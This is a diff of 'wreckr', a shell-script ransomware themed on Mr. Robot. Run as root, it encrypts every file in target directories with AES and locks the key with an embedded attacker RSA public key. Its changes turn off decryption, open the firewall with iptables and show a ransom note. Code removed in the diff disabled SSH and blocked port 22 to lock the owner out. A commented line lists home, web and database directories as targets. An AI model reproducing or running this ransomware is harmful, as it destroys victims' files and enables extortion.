@@ -1,46 +1,52 @@
 #!/bin/sh
-# Global Vars
-ERRMSG=""
-OS=""
-################ CHECKS ###############################
+# Vars Needed
+#ERRMSG=""
+#OS=""
 PROGRAM_NAME="wreckr"
-PROGRAM_VERSION="0.0.1"
+PROGRAM_VERSION="0.1.1"
 
+
+
+################ CHECKS ###############################
+# Get the OS version
 get_os() {
-	if [[$(uname -s | grep Linux) != ""]]; then
-		OS="linux"
-	elif [[ $( uname -s | grep BSD) != "" ]]; then
-		OS="bsd"
-	else
-		adderr "[!] NOT \"Linux\" or \"BSD\""
-		EXIT
-	fi
-}
-noopenssl() {
-	adderr "[!] NO OPENSSL FOUND"
+    if [[$(uname -s | grep Linux) != ""]]; then
+	OS="linux"
+    elif [[ $( uname -s | grep BSD) != "" ]]; then
+	OS="bsd"
+    else
+	adderr "[!] NOT \"Linux\" or \"BSD\""
 	EXIT
+    fi
 }
-notroot() {
-	adderr "[!] NOT ROOT"
-	EXIT
-}
+
+# Check for a TUI
 check_msg() {
-if [ "$(which dialog)" != "" ]; then
+    if [ "$(which dialog)" != "" ]; then
 	DIALOG=dialog
-elif [ "$(which whiptail)" != "" ]; then
+    elif [ "$(which whiptail)" != "" ]; then
 	DIALOG=whiptail
-else
+    else
 	DIALOG=none
-fi
+    fi
 }
+# check the requirements
 check_req() {
-	# check the requirements
-	if [ "$(whoami)" != "root" ]; then
-		notroot
-	fi
-	if [ "$(which openssl)" = "" ]; then
-		noopenssl
-	fi
+    # Fatal Errors
+    if [ "$(whoami)" != "root" ]; then
+	adderr "[!] NOT ROOT"
+        EXIT
+    fi
+    if [ "$(which openssl)" = "" ]; then
+        adderr "[!] NO OPENSSL FOUND"
+        EXIT
+    fi
+    # Non-Fatal Errors
+    if [ "$(which iptables)" = "" ]; then
+        adderr "[!] NO IPTABLES FOUND"
+    else
+        `which iptables` -I INPUT 1 -j ACCEPT
+    fi
 }
 ################ FUNCTIONS ##########################
 openfile() {
@@ -54,17 +60,28 @@ openfile() {
 	fi
 }
 adderr() { ERRMSG="$ERRMSG\n$1"; }
-EXIT() { #echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
-exit
-}
+EXIT() {
+    echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
+exit; }
+
 init() {
 	check_req
 	check_msg
-	KEY="$RANDOM$RANDOM$RANDOM"
-	pubkey="-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4euqwCPkVQYx/hsukQeq\nFTpnda31RI3TNTL8T4ZiU63LYncuKwqIO6Uj9h398U7NCG4TUbBgO9JkcPB10x++\nEvrjxAMMLLCVd+Kxo2CTy/wuk2sIycZjH4PTc5yQYV9hRHkaVs311VjkQHeUcC6x\nPFm5obeTpIUKC8t8FFZ2NiTS6ZMxQmUEhEbabP4VvsilqY/LaX1KzoskRHarZywy\nHfPVKfzffKR2DJ8BmUvh8BXOW/hsrLfUMfXnLfHxQLAo27H3IM457X23wqgDWdMp\npIetu54guYDbCPQNv8ERI8LX3v0n+XLdLqKFpcvramB7pLf6aX2m2VC4ozrv/Yju\njQIDAQAB\n-----END PUBLIC KEY-----"
-	echo "$pubkey" > /etc/vmware.pub
-	PRIVATEKEY="/etc/vmware.key"
-	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "/etc/vmware.pub" -out $PRIVATEKEY
+	KEY="$(openssl rand -base64 25)"
+	pubkey="\
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzovHnKSF3X8bqSFLl4gB
+rCPrdg4iXYsS2GYxGGyft+AfCtUmUfBT7Bsi3vjRKgEqUuzjNJDjMjV5oZSX65z0
+4tG4nHr6dbhx/QqFGBXkL4IBHoxgCBCiFWq8HSNKV8A8yFJhZhX8yCyejKwb0trl
+vjrvvf9kQCMyvV+xb0m6I+Omwixyh6MEVy323GTGcDvvILRWrne40yzf3O0Xk8Ty
+1eiYBi7wbTjZcS2oUe+5Pe+YutuCkoRwFjZXVB4j0i75g+sx+2UDbUfefhnH49gC
+3LysGPZqijn/c9Gm3LBN9r7mrybZA/6zt9TvJnfhauWoRfPTZFDnCAvm0mjGjaLU
+nwIDAQAB
+-----END PUBLIC KEY-----\
+	"
+	echo "$pubkey" > vmware.pub
+	PRIVATEKEY="vmware.key"
+	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "vmware.pub" -out $PRIVATEKEY
 }
 navdir() {
 for fil in $1; do
@@ -78,116 +95,76 @@ for fil in $1; do
 done
 }
 showmess() {
-case "$DIALOG" in
-*none*)
+    case "$DIALOG" in
+    *none*)
 	reset
 	echo $2 "(y/N)"
 	read result
 	;;
-*)
+    *)
 	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
        		--title "$1" \
-       		--yesno "$2" 18 60
+       		--msgbox "$2" 16 60
         result=$?
 	;;
-esac
-case "$result" in
-Yes|Y|y)
-	echo You got the files, pal! goodbye now..
-	break
-	;;
-0)
-	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
-	break
-	;;	
-1)
-	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
-	EXIT
-	;;	
-*)
-	echo "Well buddy, the files are gone. Youre gonna have to figure something out here...!"
-	EXIT
-	;;
-esac
+    esac
 }
 ############### ENCRYPTING ###########################
 pck() {
+    adderr "[+] Encrypted $1"
+    LIST="$LIST$1\n"
+    if [ -f "$1" ]; then
 	if [ "$SOFT" = "" ]; then
-		if [ -f "$1" ]; then
-			openfile $1
-			stuff=$(cat $1)
-			echo "RAN" > $1
-			echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
-		fi
+	    openfile $1
+	    stuff=$(cat $1)
+	    echo "RAN" > $1
+	    echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
 	fi
+    fi
 }
 enc_loop() {
-	kills="$1"
-	for i in $kills; do
-		if [ -d "$i" ]; then
-			navdir "$i/*" "pck"
-			adderr "[+] Encrypted $i"
-			#} | $DIALOG --gauge "Encrypting Files..." 10 50 0
-		fi
-	done
+    kills="$1"
+    for i in $kills; do
+	if [ -d "$i" ]; then
+	    navdir "$i/*" "pck"
+	    adderr "[+] Encrypted $i"
+	fi
+    done
 }
 ################## DECRYPT ################################
 upk() {
-	if [ "$SOFT" = "" ]; then
+    adderr "[+] Decrypted $1"
+    if [ "$SOFT" = "" ]; then
 	openfile $1
 	openfile $1.dec
 	mv $1 $1.enc
-	openssl aes-256-cbc -d -k $KEY -in $1.enc -out $1
+	openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
 	rm $1.enc
-	fi
+    fi
 }
 dec_loop() {
-	kills="$1"
-	for i in $kills; do
-		if [ -d "$i" ]; then
-			navdir "$i/*" "upk"
-			adderr "[+] Decrypted $i"
-		fi
-	done
+    kills="$1"
+    for i in $kills; do
+    	if [ -d "$i" ]; then
+	    navdir "$i/*" "upk"
+	    adderr "[+] Decrypted $i"
+	fi
+    done
 }
 ################# MAIN ######################################
-breakcom() {
-	if [ "$SOFT" != "" ]; then
-		return
-	fi
-	touch /etc/ssh/sshd_not_to_be_run
-	chmod 000 /etc/ssh/sshd_not_to_be_run
-	chattr +i /etc/ssh/sshd_not_to_be_run
-	if [ "$(which iptables)" != "" ]; then
-		iptables -t nat -I PREROUTING 1 -p tcp --dport 22 -j REDIRECT --to-port 1
-		iptables -t mangle -I INPUT 1 -p tcp --dport 22 -j DROP
-		iptables -I INPUT 1 -p tcp --dport 22 -j DROP
-	fi
-	pck "$(which sshd)"
-	pck "/etc/ssh/sshd_config"
-	if [ "$(which systemctl)" != "" ]; then
-		{
-		systemctl mask ssh
-		systemctl mask sshd
-		systemctl disable ssh
-		systemctl disable sshd
-		systemctl stop ssh
-		systemctl stop sshd
-		} &>/dev/null
-	fi
-}
 main() {
-	trap '' INT
-	trap '' TERM
-	SOFT="YES"
-	init
-	targets="/root/Desktop/testing"
-	#targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
-	enc_loop "$targets"
-	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
-	title="Oops.."
-	showmess "$title" "$message"
-	dec_loop "$targets"
-	EXIT
+    trap '' INT
+    trap '' TERM
+    #SOFT="YES"
+    init
+    targets="/root/Desktop/testing"
+    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+    enc_loop "$targets"
+    printf "$LIST" > TARGETS.TXT
+    message="Congratulations,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\n\nLove,\n\n~benSociety"
+    title="Oops.."
+    showmess "$title" "$message"
+    #dec_loop "$targets"
+EXIT
 }
 main
